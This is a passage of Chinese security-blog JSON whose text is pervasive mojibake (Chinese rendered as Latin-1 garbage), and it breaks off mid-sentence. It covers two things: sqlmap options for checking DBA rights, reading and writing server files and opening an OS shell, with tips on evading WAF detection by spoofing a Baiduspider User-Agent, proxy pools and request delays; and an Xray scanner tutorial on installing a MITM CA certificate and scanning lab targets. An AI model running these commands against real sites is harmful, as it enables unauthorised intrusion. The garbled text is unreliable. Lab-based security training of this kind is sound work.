2ã€â€“is-dbaï¼šå½“å‰ç”¨æˆ·æ˜¯å¦ä¸ºç®¡ç†æƒé™&emsp;&emsp;è¯¥å‘½ä»¤ç”¨æˆ·æŸ¥çœ‹å½“å‰è´¦æˆ·æ˜¯å¦ä¸ºæ•°æ®åº“ç®¡ç†å‘˜è´¦æˆ·ï¼Œæ£€æµ‹DBMSå½“å‰ç”¨æˆ·æ˜¯å¦DBAã€‚å¦‚ä¸‹æ‰€ç¤ºï¼Œåœ¨æœ¬æ¡ˆä¾‹ä¸­è¾“å…¥è¯¥å‘½ä»¤ï¼Œä¼šè¿”å›trueï¼Œç»“æœå¦‚å›¾æ‰€ç¤ºï¼š Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --is-dba 3ã€â€“rolesï¼šåˆ—å‡ºæ•°æ®åº“ç®¡ç†å‘˜çš„è§’è‰²&emsp;&emsp;è¯¥å‘½ä»¤ç”¨æˆ·æŸ¥çœ‹æ•°æ®åº“ç”¨æˆ·çš„è§’è‰²ï¼Œæšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·çš„è§’è‰²ã€‚å¦‚æœå½“å‰ç”¨æˆ·æœ‰æƒé™è¯»å–åŒ…å«æ‰€æœ‰ç”¨æˆ·çš„è¡¨ï¼Œè¾“å…¥è¯¥å‘½ä»¤ä¼šåˆ—ä¸¾å‡ºæ¯ä¸ªç”¨æˆ·çš„è§’è‰²ï¼Œä¹Ÿå¯ä»¥ç”¨**-U**å‚æ•°(-U USERï¼Œç”¨æ¥è¿›è¡Œæšä¸¾çš„æ•°æ®åº“ç”¨æˆ· )æŒ‡å®šæƒ³çœ‹å“ªä¸ªç”¨æˆ·çš„è§’è‰²ï¼Œç»“æœå¦‚å›¾æ‰€ç¤ºï¼š Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --roles 4ã€â€“refererï¼šHTTP Refererå¤´&emsp;&emsp;Sqlmapå¯ä»¥åœ¨è¯·æ±‚ä¸­ä¼ªé€ httpä¸­çš„refererï¼Œå½“levelå‚æ•°è®¾å®šä¸º3æˆ–è€…3ä»¥ä¸Šæ—¶ï¼Œä¼šå°è¯•å¯¹refererå¤´æ³¨å…¥ã€‚å¯ä»¥ä½¿ç”¨refererå‘½ä»¤æ¥æ¬ºéª—ã€‚å¦‚ï¼š Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --referer http://www.baidu.com &emsp;&emsp;HTTP Refereræ˜¯headerçš„ä¸€éƒ¨åˆ†ï¼Œå½“æµè§ˆå™¨å‘webæœåŠ¡å™¨å‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œä¸€èˆ¬ä¼šå¸¦ä¸ŠRefererï¼Œå‘Šè¯‰æœåŠ¡å™¨è¯¥ç½‘é¡µæ˜¯ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥çš„ï¼ŒæœåŠ¡å™¨å› æ­¤å¯ä»¥è·å¾—ä¸€äº›ä¿¡æ¯ç”¨äºå¤„ç†ã€‚ 5ã€sql-shellï¼šè¿è¡Œè‡ªå®šä¹‰sqlè¯­å¥&emsp;&emsp;è¯¥å‘½ä»¤ç”¨æˆ·æ‰§è¡ŒæŒ‡å®šçš„SQLè¯­å¥ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œå‡è®¾æ‰§è¡Œselect * from users limit 0,1 è¯­å¥ Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --sql-shell 6ã€â€“os-cmdï¼Œâ€“os-shellï¼šè¿è¡Œä»»æ„æ“ä½œç³»ç»Ÿå‘½ä»¤&emsp;&emsp;è¯¥å‘½ä»¤ç”¨æˆ·æ‰§è¡Œä»»æ„æ“ä½œç³»ç»Ÿå‘½ä»¤ï¼Œå¦‚ä¸‹æ‰€ç¤º Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --os-shell &emsp;&emsp;å¯¹äºMySQLæ¥è¯´ï¼Œå®é™…ä¸Šæ˜¯å†™å…¥ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯ä¸Šä¼ æ–‡ä»¶çš„ï¼Œä¸€ä¸ªæ˜¯æ‰§è¡Œå‘½ä»¤çš„ï¼Œå…·ä½“å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼šhttps://xz.aliyun.com/t/7942 &emsp;&emsp;è¯·ç‰¹åˆ«æ³¨æ„ï¼šä½¿ç”¨è¯¥å‘½ä»¤æœ‰å‡ ä¸ªå¿…é¡»å…·å¤‡çš„æ¡ä»¶ æ•°æ®åº“ç”¨æˆ·æ˜¯dbaæƒé™ çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„ phpå½“ä¸­çš„gpcä¸ºoffæ—¶ï¼Œphpè‡ªåŠ¨è½¬ä¹‰ä¸ºå…³é—­çŠ¶æ€ å°±ç®—å…·å¤‡ä»¥ä¸Š3ä¸ªæ¡ä»¶ï¼Œå› ä¸ºæ¶‰åŠåˆ°ç³»ç»Ÿå‘½ä»¤ï¼Œä¹Ÿæœªå¿…å¯ä»¥æ‰§è¡ŒæˆåŠŸ 7ã€â€“file-readï¼šä»æ•°æ®åº“æœåŠ¡å™¨ä¸­è¯»å–æ–‡ä»¶&emsp;&emsp;è¯¥å‘½ä»¤ç”¨äºè¯»å–æ‰§è¡Œæ–‡ä»¶ Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --file-read &quot;è¦è¯»å–çš„æ–‡ä»¶è·¯å¾„&quot; 8ã€â€“file-writeï¼Œâ€“file-destï¼šä¸Šä¼ æ–‡ä»¶åˆ°æ•°æ®åº“æœåŠ¡å™¨ä¸­&emsp;&emsp;è¯¥å‘½ä»¤ç”¨äºä¸Šä¼ æ–‡ä»¶ Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --file-write &quot;ä¸Šä¼ æ–‡ä»¶è·¯å¾„(ç›¸å¯¹è·¯å¾„)&quot; --file-dest &quot;ç›®æ ‡æ–‡ä»¶ç³»ç»Ÿç»å¯¹è·¯å¾„&quot; 9ã€â€“proxy&emsp;&emsp;å½“é‡åˆ°ç½‘ç«™å¼€å¯äº†æµé‡æ£€æµ‹ï¼Œæ£€æµ‹åŒä¸€ä¸ªIPçš„åœ¨æŸä¸€æ—¶é—´çš„è¯·æ±‚æ€»æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»£ç†æ± æ¥ç»•è¿‡æ£€æµ‹ 10ã€â€“user-agent&emsp;&emsp;å¯ä»¥ä¼ªé€ User-Agentï¼Œå› ä¸ºSqlmapè‡ªå¸¦çš„User-Agentæ˜¯å¸¦æœ‰Sqlmapçš„æŒ‡çº¹ä¿¡æ¯çš„ï¼Œå› æ­¤å¯ä»¥æŒ‡å®šUser-Agenté˜²æ­¢è¢«æ£€æµ‹åˆ°æ˜¯Sqlmapè€Œè¢«æ‹¦æˆª &emsp;&emsp;æ¯”å¦‚è¿™é‡Œä½¿ç”¨burpæŠ“åŒ…ï¼Œå¯ä»¥çœ‹åˆ°æœ‰Sqlmapçš„æŒ‡çº¹ä¿¡æ¯ &emsp;&emsp;åªè¦æ›´æ”¹äº†ä»£ç†å°±å¯ä»¥é™¤å»Sqlmapçš„æŒ‡çº¹ä¿¡æ¯ï¼Œç»•è¿‡Wafçš„å·¥å…·æ£€æµ‹ &emsp;&emsp;æŸç½‘ç«™å¼€å¯äº†æµé‡é˜²æŠ¤ï¼Œä½†æ˜¯å¦‚æœç½‘ç«™å¼€å¯äº†å¦‚æœç½‘ç«™Wafè®¾ç½®äº†çˆ¬è™«ç™½åå•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä¼ªè£…æˆæœç´¢å¼•æ“çš„User-Agentæ¥è¿›è¡Œç»•è¿‡ sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --proxy=&quot;http://127.0.0.1:8888&quot; --user-agent=&quot;Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html)&quot; 11ã€â€“random-agent&emsp;&emsp;éšæœºæŒ‡å®šä»£ç† &emsp;&emsp;å¯ä»¥åœ¨è¿™é‡Œæ·»åŠ ä»£ç† 12ã€â€“delay å»¶æ—¶&emsp;&emsp;æ¯ä¸ªHTTPè¯·æ±‚ä¹‹é—´çš„å»¶è¿Ÿï¼ˆç§’ï¼‰ &emsp;&emsp;å½“ç½‘ç«™å¼€å¯äº†CCæµé‡é˜²æŠ¤ç­‰æªæ–½é˜²æ­¢å¤§é‡æµé‡æ”»å‡»æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨--delayå‚æ•°æ¥å‡ç¼“æˆ‘ä»¬çš„è¯·æ±‚é€Ÿåº¦ sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --user-agent=&quot;Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)&quot; --delay=1","categories":[{"name":"å®‰å…¨å·¥å…·/å®‰å…¨å¼€å‘","slug":"å®‰å…¨å·¥å…·-å®‰å…¨å¼€å‘","permalink":"https://wolke.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"https://wolke.cn/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"Sqlmap","slug":"Sqlmap","permalink":"https://wolke.cn/tags/Sqlmap/"}],"author":"w01ke"},{"title":"Xrayï¼šä¸€æ¬¾è‡ªåŠ¨åŒ–Webæ¼æ´æ‰«æç¥å™¨","slug":"Xrayï¼šä¸€æ¬¾è‡ªåŠ¨åŒ–Webæ¼æ´æ‰«æç¥å™¨","date":"2022-02-14T14:42:37.000Z","updated":"2022-02-14T15:04:29.437Z","comments":true,"path":"post/60ade18e.html","link":"","permalink":"https://wolke.cn/post/60ade18e.html","excerpt":"","text":"ä¸€ã€Xrayç®€ä»‹&emsp;&emsp;xray æ˜¯ä»é•¿äº­æ´é‰´æ ¸å¿ƒå¼•æ“ä¸­æå–å‡ºçš„ç¤¾åŒºç‰ˆæ¼æ´æ‰«æç¥å™¨ï¼Œæ”¯æŒä¸»åŠ¨ã€è¢«åŠ¨å¤šç§æ‰«ææ–¹å¼ï¼Œè‡ªå¤‡ç›²æ‰“å¹³å°ã€å¯ä»¥çµæ´»å®šä¹‰ POCï¼ŒåŠŸèƒ½ä¸°å¯Œï¼Œè°ƒç”¨ç®€å•ï¼Œæ”¯æŒ Windowsã€macOSã€Linux å¤šç§æ“ä½œç³»ç»Ÿï¼Œå¯ä»¥æ»¡è¶³å¹¿å¤§å®‰å…¨ä»ä¸šè€…çš„è‡ªåŠ¨åŒ– Web æ¼æ´æ¢æµ‹éœ€æ±‚ã€‚ Githubåœ°å€ï¼šhttps://github.com/chaitin/xray äºŒã€ç‰¹è‰² ä½¿ç”¨ go è¯­è¨€ç¼–å†™ï¼Œè·¨å¹³å°ã€çº¯å¼‚æ­¥ã€æ— é˜»å¡ï¼Œå¹¶å‘èƒ½åŠ›å¼ºï¼Œæ‰«æé€Ÿåº¦æ æ çš„ æä¾›å¤šç§ä½¿ç”¨æ–¹å¼ï¼Œè°ƒç”¨å§¿åŠ¿æ–¹ä¾¿ï¼Œè¾“å…¥è¾“å‡ºéå¸¸æ ‡å‡†åŒ–ï¼Œæå…·å¯é›†æˆæ€§ ä½¿ç”¨ YAML é…ç½®æ–‡ä»¶éå¸¸æ–¹ä¾¿åœ°å®šä¹‰ POCï¼Œå¯ä»¥å¿«é€Ÿæ‰©å±•æ‰«æèƒ½åŠ› å…¨ç¨‹ä½¿ç”¨æ— å®³ POC è¿›è¡Œæ¢æµ‹ï¼Œåœ¨ç¡®ä¿èƒ½å‘ç°æ¼æ´çš„åŸºç¡€ä¸Šä¸ä¼šç»™ä¸šåŠ¡å¸¦æ¥ä¸¥é‡å½±å“ï¼Œéå¸¸é€‚ç”¨äºä¼ä¸šå†…éƒ¨å®‰å…¨å»ºè®¾ å‘½ä»¤è¡Œå¼çš„å…è´¹è¢«åŠ¨æ‰«æå·¥å…·ï¼Œä¸å¤šè§ è‡ªå¤‡ç›²æ‰“å¹³å°ï¼Œå¯æ£€æµ‹éœ€è¦åè¿æ‰èƒ½è§¦å‘çš„æ¼æ´ï¼Œå¦‚ï¼šå­˜å‚¨å‹ XSSã€æ— å›æ˜¾çš„ SSRFã€XXEã€å‘½ä»¤æ³¨å…¥ç­‰ æ›´æ–°é€Ÿåº¦å¿«ï¼Œç”¨ç€ä¸çˆ½å¯ä»¥åœ¨ github æéœ€æ±‚ï¼Œå¾ˆå¿«å°±èƒ½è§£å†³ï¼ˆæˆ‘è¯•è¿‡äº†ï¼Œæ˜¯çœŸçš„ï¼‰ ä¸‰ã€ä½¿ç”¨äººç¾¤ ç™½å¸½å­ã€‚æŒ– SRC å¿…å¤‡ï¼Œæ‰“å¼€æµè§ˆå™¨æŒ‚ä¸Šä»£ç†ï¼Œç„¶åä¸Šç½‘å†²æµªç­‰æ¼æ´å°±å¯¹äº†ï¼Œè¿˜ä¸å¤Ÿçš„è¯å°±æŠŠä»£ç†ç»™ä½ çˆ¸å¦ˆã€ç»™ä½ å¦¹å­ã€ç»™ä½ å®¶çŒ«éƒ½æŒ‚ä¸Š ç”²æ–¹å®‰å…¨å»ºè®¾è€…ã€‚å·¥å…·åœ¨æ‰‹ï¼Œå¤©ä¸‹æˆ‘æœ‰ï¼Œç»†ç²’åº¦é…ç½®ï¼Œé«˜ç²¾åº¦æ‰«æï¼Œå¯ä½œä¸ºå®šæœŸå·¡æ£€ã€å¸¸è§„æ‰«æçš„è¾…åŠ©ç¥å™¨ ä¹™æ–¹å·¥å…·å¼€å‘è€…ã€‚åœ¨ç¼–å†™æ¸—é€æ¡†æ¶æˆ–è€…æ¼æ´æ‰«ææ¡†æ¶æ—¶ï¼Œä½œä¸ºæ‰«ææ¢é’ˆè¿›è¡Œé›†æˆï¼Œç®€ç›´æ˜¯å¤§å¹³å°ä¸­çš„å°å°–åˆ€ å››ã€åŸºäºä»£ç†çš„è¢«åŠ¨æ‰«æ&emsp;&emsp;ä»£ç†æ¨¡å¼ä¸‹çš„åŸºæœ¬æ¶æ„ä¸ºï¼Œæ‰«æå™¨ä½œä¸ºä¸­é—´äººï¼Œé¦–å…ˆåŸæ ·è½¬å‘æµé‡ï¼Œå¹¶è¿”å›æœåŠ¡å™¨å“åº”ç»™æµè§ˆå™¨ç­‰å®¢æˆ·ç«¯ï¼Œé€šè®¯ä¸¤ç«¯éƒ½è®¤ä¸ºè‡ªå·±ç›´æ¥ä¸å¯¹æ–¹å¯¹è¯ï¼ŒåŒæ—¶è®°å½•è¯¥æµé‡ï¼Œç„¶åä¿®æ”¹å‚æ•°å¹¶é‡æ–°å‘é€è¯·æ±‚è¿›è¡Œæ‰«æã€‚è¿™ç§åŸç†å’Œ Burpsuite çš„è‡ªå¸¦çš„æ¼æ‰«åŸç†æ˜¯ä¸€æ ·çš„ã€‚ 1ã€ç”ŸæˆCAè¯ä¹¦&emsp;&emsp;éœ€è¦æ³¨æ„ä¸€ä¸‹çš„æ˜¯ï¼Œå¾ˆå¤šæ—¶å€™è¿˜ä¼šæ‰«åˆ° HTTPS ç«™ç‚¹ï¼Œå¯èƒ½ä¼šå› ä¸ºæœ‰ä»£ç†è€Œå¯¼è‡´æ— æ³•è®¿é—®ï¼Œæˆ–è€…éœ€è¦æ‰‹åŠ¨ç¡®è®¤å®‰å…¨é£é™©ã€‚è¿™æ—¶å€™éœ€è¦æˆ‘ä»¬å¯¼å…¥ xray è¿è¡Œç›®å½•ä¸‹çš„ ca.crt è¯ä¹¦ï¼Œå…³äºå¦‚ä½•å¯¼å…¥ CA è¯ä¹¦ï¼Œè¯·æ‰“å¼€ç™¾åº¦æœç´¢ â€œå®‰è£…CAè¯ä¹¦â€ã€‚ &emsp;&emsp;åœ¨æµè§ˆå™¨ä½¿ç”¨ https åè®®é€šä¿¡çš„æƒ…å†µä¸‹ï¼Œå¿…é¡»è¦å¾—åˆ°å®¢æˆ·ç«¯çš„ä¿¡ä»»ï¼Œæ‰èƒ½å»ºç«‹ä¸å®¢æˆ·ç«¯çš„é€šä¿¡ã€‚ &emsp;&emsp;è¿™é‡Œçš„çªç ´å£å°±æ˜¯ ca è¯ä¹¦ã€‚åªè¦è‡ªå®šä¹‰çš„ ca è¯ä¹¦å¾—åˆ°äº†å®¢æˆ·ç«¯çš„ä¿¡ä»»ï¼Œxray å°±èƒ½ç”¨è¯¥ ca è¯ä¹¦ç­¾å‘å„ç§ä¼ªé€ çš„æœåŠ¡å™¨è¯ä¹¦ï¼Œä»è€Œè·å–åˆ°é€šä¿¡å†…å®¹ã€‚ ã€Windowsã€‘.\\xray_windows_amd64.exe gencaã€Linuxã€‘./xray_linux_amd64 genca &emsp;&emsp;è¿è¡Œå‘½ä»¤ä¹‹åï¼Œå°†åœ¨å½“å‰æ–‡ä»¶å¤¹ç”Ÿæˆ ca.crt å’Œ ca.key ä¸¤ä¸ªæ–‡ä»¶ã€‚ &emsp;&emsp;æœ¬å‘½ä»¤åªéœ€è¦ç¬¬ä¸€æ¬¡ä½¿ç”¨çš„æ—¶å€™è¿è¡Œå³å¯ï¼Œå¦‚æœæ–‡ä»¶å·²ç»å­˜åœ¨å†æ¬¡è¿è¡Œä¼šæŠ¥é”™ï¼Œéœ€è¦å…ˆåˆ é™¤æœ¬åœ°çš„ ca.crt å’Œ ca.key æ–‡ä»¶ã€‚ 2ã€å®‰è£…CAè¯ä¹¦ï¼ˆ1ï¼‰Firefox&emsp;&emsp;å¦‚æœä½¿ç”¨çš„æ˜¯ FireFox æµè§ˆå™¨ï¼Œå®ƒæœ‰è‡ªå·±çš„è¯ä¹¦ä½“ç³»ã€‚ ï¼ˆ2ï¼‰å…¶ä»–&emsp;&emsp;å¦‚æœä½¿ç”¨çš„æ˜¯ IEã€Chromeã€curl ç­‰å®¢æˆ·ç«¯ï¼Œå»ºè®®å°† ca è¯ä¹¦å®‰è£…åœ¨æ“ä½œç³»ç»Ÿä¸Šï¼Œè¯·æ ¹æ®ä¸åŒçš„æ“ä½œç³»ç»Ÿï¼Œé€‰æ‹©å‚ç…§ä¸‹æ–¹çš„æ•™ç¨‹ã€‚ â‘  Windows&emsp;&emsp;åŒå‡» ca.crtï¼Œç„¶åæŒ‰ç…§ä¸‹å›¾çš„æ­¥éª¤æ“ä½œã€‚ â‘¡ Linux&emsp;&emsp;å°† ca.crt å¤åˆ¶åˆ° /usr/local/share/ca-certificates/ï¼Œç„¶åæ‰§è¡Œ update-ca-certificatesã€‚ sudo cp ca.crt /usr/local/share/ca-certificates/xray.crtsudo update-ca-certificates â‘¢ MacOS&emsp;&emsp;åŒå‡» ca.crtï¼Œç„¶åæŒ‰ç…§ä¸‹å›¾çš„æ­¥éª¤æ“ä½œã€‚ &emsp;&emsp;å³ä¸Šè§’æœç´¢ x-rayï¼Œå¯ä»¥çœ‹åˆ°ä¸€æ¡è®°å½•ï¼Œæœ‰ä¸€ä¸ªçº¢å‰ï¼Œè¢«æ ‡è®°ä¸ºä¸å—ä¿¡ä»»çš„ã€‚ &emsp;&emsp;ç„¶ååŒå‡»è¿™æ¡è®°å½•ï¼Œå°† SSL é‚£ä¸€é¡¹æ”¹ä¸ºå§‹ç»ˆä¿¡ä»»ï¼Œç„¶åç‚¹å‡»å·¦ä¸Šè§’å…³é—­çª—å£ï¼Œè¾“å…¥å¯†ç æˆæƒã€‚ â‘£ Android&emsp;&emsp;å¯ä»¥å°† ca.crt æ–‡ä»¶ä¼ é€åˆ°æ‰‹æœºä¸Šï¼Œç„¶åæ‰“å¼€ &emsp;&emsp;æˆ–è€…å‚è€ƒä¸‹é¢çš„æ­¥éª¤ï¼Œå°†æ‰‹æœºé…ç½®ä»£ç†ä¹‹åï¼Œä½¿ç”¨æµè§ˆå™¨è®¿é—® http://xray/ ç„¶åç‚¹å‡»ä¸‹è½½ ca è¯ä¹¦ï¼Œç„¶åå†å®‰è£…ã€‚ â‘¤ IOS&emsp;&emsp;å¯ä»¥å°† ca.crt æ–‡ä»¶ä¼ é€åˆ°æ‰‹æœºä¸Šï¼Œç„¶åç‚¹å‡»æ‰“å¼€æ‰“å¼€ã€‚ &emsp;&emsp;æˆ–è€…å‚è€ƒåç»­çš„æ­¥éª¤ï¼Œå°†æ‰‹æœºé…ç½®ä»£ç†ä¹‹åï¼Œä½¿ç”¨æµè§ˆå™¨è®¿é—® http://xray/ ç„¶åç‚¹å‡»ä¸‹è½½ ca è¯ä¹¦ï¼Œç„¶åå†å®‰è£…ã€‚ &emsp;&emsp;ç„¶åå»è®¾ç½®é¦–é¡µï¼ŒæŸ¥çœ‹ä¸‹è½½çš„æè¿°æ–‡ä»¶ã€‚ &emsp;&emsp;ç‚¹å‡»å³ä¸Šè§’å®‰è£…ï¼Œè¾“å…¥å¯†ç æˆæƒã€‚ &emsp;&emsp;ç‚¹å‡»é€šç”¨è®¾ç½®-å…³äºï¼Œåœ¨æœ€åä¸€é¡¹è¯ä¹¦ä¿¡ä»»è®¾ç½®ä¸­ï¼Œå°† Insecure Root CA For X-Ray Scanner ä¸€é¡¹çš„å¼€å…³æ‰“å¼€ã€‚ 3ã€å¯åŠ¨ä»£ç†&emsp;&emsp;åœ¨æ‰«æä¹‹å‰ï¼Œæˆ‘ä»¬è¿˜éœ€è¦åšä¸€äº›å¿…è¦çš„è®¾ç½® &emsp;&emsp;ç¬¬ä¸€æ¬¡å¯åŠ¨ xray ä¹‹åï¼Œå½“å‰ç›®å½•ä¼šç”Ÿæˆ config.yml æ–‡ä»¶ï¼Œé€‰æ‹©æ–‡ä»¶ç¼–è¾‘å™¨æ‰“å¼€ï¼Œå¹¶æŒ‰ç…§ä¸‹æ–¹è¯´æ˜ä¿®æ”¹ã€‚ï¼ˆè¿™é‡Œæˆ‘å°±ä¸æ”¹äº†ï¼‰ mitm: ... restriction: hostname_allowed: # å…è®¸è®¿é—®çš„ Hostnameï¼Œæ”¯æŒæ ¼å¼å¦‚ t.comã€*.t.comã€1.1.1.1ã€1.1.1.1/24ã€1.1-4.1.1-8 - testphp.vulnweb.com &emsp;&emsp;å› ä¸ºæˆ‘ä»¬çš„æµ‹è¯•ç›®æ ‡ç«™å°±æ˜¯ http://testphp.vulnweb.comï¼Œå¢åŠ è¿™ä¸ªè¿‡æ»¤ä¹‹åï¼Œxray å°†åªä¼šæ‰«æè¯¥ç«™çš„æµé‡ï¼Œé¿å…æ‰«æåˆ°éæˆæƒç›®æ ‡ç«™ç‚¹ã€‚ è®¾å®šæ¼æ´æ‰«æç»“æœçš„è¾“å‡ºï¼Œè¿™é‡Œé€‰æ‹©ä½¿ç”¨ html æ–‡ä»¶è¾“å‡ºï¼Œæ‰€ä»¥å‘½ä»¤è¡Œåé¢è¦å¢åŠ  --html-output xray-testphp.htmlã€‚ --text-outputï¼šè¾“å‡ºåˆ°æ–‡æœ¬æ–‡ä»¶ä¸­--json-outputï¼šè¾“å‡ºåˆ°JSONæ–‡ä»¶ä¸­--html-outputï¼šè¾“å‡ºåˆ°HTMLæ–‡ä»¶ä¸­ xray é…ç½®æ–‡ä»¶ä¸­é»˜è®¤ä¸å…è®¸æ‰«æ gov å’Œ edu ç­‰ç½‘ç«™ï¼Œå¦‚æœæƒ³å¯¹è¿™äº›ç½‘ç«™è¿›è¡Œæˆæƒæµ‹è¯•ï¼Œéœ€è¦ç§»é™¤ hostname_disallowed çš„ç›¸å…³é…ç½®æ‰å¯ä»¥ã€‚ä¸¥ç¦æœªæˆæƒçš„æµ‹è¯•ï¼å¦åˆ™åæœè‡ªè´Ÿã€‚ ./xray_linux_amd64 webscan --listen 127.0.0.1:7777 --html-output xray-testphp.html ã€å¸¸è§é—®é¢˜ã€‘ å¦‚ä½•é€€å‡ºï¼Ÿctrl + c æç¤º file xray-testphp.html already existsï¼Œå¯ä»¥åˆ é™¤å·²ç»å­˜åœ¨çš„æŠ¥å‘Šæ–‡ä»¶ï¼Œæˆ–è€…ä½¿ç”¨ä¸€ä¸ªæ–°çš„æ–‡ä»¶åï¼Œæˆ–è€…åœ¨æ–‡ä»¶åä¸­åŠ å…¥ __timestamp__ æˆ– __datetime__ å°†è‡ªåŠ¨æ›¿æ¢ä¸ºå®é™…å€¼ã€‚ 4ã€é…ç½®ä»£ç†ï¼ˆ1ï¼‰Edge&emsp;&emsp;æŒ‰ç…§ä¸‹å›¾çš„æ­¥éª¤æ“ä½œ ï¼ˆ2ï¼‰Chrome&emsp;&emsp;Chrome å¯ä»¥ä½¿ç”¨æ“ä½œç³»ç»Ÿçš„ä»£ç†é…ç½®ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥ä½¿ç”¨æ’ä»¶æ§åˆ¶ï¼Œè¿™é‡Œæ¨èä½¿ç”¨æ’ä»¶ï¼Œå¯ä»¥æ›´åŠ çµæ´»çš„å»é…ç½®ä»£ç†ã€‚ &emsp;&emsp;é¦–å…ˆç‚¹å‡» Chrome Store &emsp;&emsp;ç„¶åç‚¹å‡»åŒæ„ç›¸å…³çš„åè®®å’Œæƒé™ç”³è¯·å¼¹æ¡†ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ Chrome æµè§ˆå™¨çš„å³ä¸Šè§’çœ‹åˆ°ä¸€ä¸ªåœ†å½¢å›¾æ ‡çš„æ’ä»¶äº†ã€‚ &emsp;&emsp;æ–°å»ºæƒ…æ™¯æ¨¡å¼ï¼Œå‘½åä¸º xrayï¼Œç„¶å todo todo &emsp;&emsp;é€‰æ‹© xray æ¨¡å¼ï¼Œè¿™æ · Chrome å°±ä¼šä½¿ç”¨ xray ä½œä¸ºä»£ç†äº†ã€‚ ï¼ˆ3ï¼‰Firefox&emsp;&emsp;ä¸å†èµ˜è¿° ï¼ˆ4ï¼‰IOS&emsp;&emsp;æŒ‰ç…§ä¸‹å›¾çš„æ­¥éª¤æ“ä½œ ï¼ˆ5ï¼‰Android&emsp;&emsp;ä¸å†èµ˜è¿° 5ã€å¼€å§‹æ‰«æ&emsp;&emsp;ä½¿ç”¨æµè§ˆå™¨è®¿é—®è‡ªå·±çš„pikachué¶åœºï¼Œç„¶åå°±å¯ä»¥çœ‹åˆ° xray ç•Œé¢å¼€å§‹è¾“å‡ºæ¼æ´ä¿¡æ¯ äº”ã€ä½¿ç”¨xrayåŸºç¡€çˆ¬è™«æ¨¡å¼è¿›è¡Œæ¼æ´æ‰«æ&emsp;&emsp;çˆ¬è™«æ¨¡å¼æ˜¯æ¨¡æ‹Ÿäººå·¥å»ç‚¹å‡»ç½‘é¡µçš„é“¾æ¥ï¼Œç„¶åå»åˆ†ææ‰«æï¼Œå’Œä»£ç†æ¨¡å¼ä¸åŒçš„æ˜¯ï¼Œçˆ¬è™«ä¸éœ€è¦äººå·¥çš„ä»‹å…¥ï¼Œè®¿é—®é€Ÿåº¦è¦å¿«å¾ˆå¤šï¼Œä½†æ˜¯ä¹Ÿæœ‰ä¸€äº›ç¼ºç‚¹éœ€è¦æ³¨æ„ xray çš„åŸºç¡€çˆ¬è™«ä¸èƒ½å¤„ç† js æ¸²æŸ“çš„é¡µé¢ï¼Œå¦‚æœéœ€è¦æ­¤åŠŸèƒ½ï¼Œè¯·å‚è€ƒ ç‰ˆæœ¬å¯¹æ¯” 1ã€å¯åŠ¨çˆ¬è™«./xray_linux_amd64 webscan --basic-crawler http://testphp.vulnweb.com/ --html-output xray-crawler-testphp.html è¿™å¯èƒ½æ˜¯æœ€ç®€å•æœ€å¸¸ç”¨çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œå°±æ˜¯å¤ªé•¿äº†ï¼Œä½“éªŒä¸å¤ªå‹å¥½ï¼Œå»ºè®®å¸¸ç”¨çš„åŒå­¦å¯ä»¥ alias xray=&quot;/path/xray webscan --basic-crawler&quot; &emsp;&emsp;æ¯”å¦‚å¯¹pikachué¶åœºä¸­çš„XSSè¿›è¡Œæ‰«æ 2ã€ç™»å½•åçš„ç½‘ç«™æ‰«æ&emsp;&emsp;å¦‚æœç”¨çš„æ˜¯ä»£ç†æ¨¡å¼ï¼Œåªè¦æµè§ˆå™¨æ˜¯ç™»å½•çŠ¶æ€ï¼Œé‚£ä¹ˆæ¼æ´æ‰«ææ”¶åˆ°çš„è¯·æ±‚ä¹Ÿéƒ½æ˜¯ç™»å½•çŠ¶æ€çš„è¯·æ±‚ã€‚ä½†å¯¹äºæ™®é€šçˆ¬è™«è€Œè¨€ï¼Œå°±æ²¡æœ‰è¿™ä¹ˆâ€œè‡ªåŠ¨åŒ–â€äº†ï¼Œ ä½†æ˜¯å¯ä»¥é€šè¿‡é…ç½® Cookie çš„æ–¹å¼å®ç°ç™»å½•åçš„æ‰«æã€‚ &emsp;&emsp;æ‰“å¼€é…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹ http é…ç½®éƒ¨åˆ†çš„ Headers é¡¹ï¼š http: headers: Cookie: key=value &emsp;&emsp;ä¸Šè¿°é…ç½®å°†ä¸ºæ‰€æœ‰è¯·æ±‚ï¼ˆåŒ…æ‹¬çˆ¬è™«å’Œæ¼æ´æ‰«æï¼‰å¢åŠ ä¸€æ¡ Cookie key=value å…­ã€ä½¿ç”¨xrayè¿›è¡ŒæœåŠ¡æ‰«æ&emsp;&emsp;xray ä¸­æœ€å¸¸è§çš„æ˜¯ web æ‰«æï¼Œä½†æ˜¯ xray 